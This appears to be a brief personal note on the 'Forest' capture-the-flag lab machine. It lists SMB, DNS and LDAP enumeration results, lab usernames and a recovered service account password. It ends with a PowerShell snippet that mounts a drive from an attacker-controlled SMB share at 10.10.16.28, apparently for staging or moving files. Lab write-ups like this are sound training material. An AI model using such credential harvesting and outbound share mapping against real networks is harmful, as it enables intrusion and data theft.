# Forest

---

## Setup




---

## Enumeration

1. SMB
	No shares in anonymous

2. DNS Reverse Lookup
	Nothing useful.

3. LDAP Enum:

users:

sebastien
lucinda
andy
mark
santi


creds: svc-alfresco:s3rvice

$pass = convertto-securestring "afanok" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('konafa', $pass)
New-PSDrive -Name pwnlol -PSProvider FileSystem -Credential $cred -Root \\10.10.16.28\pwnlol
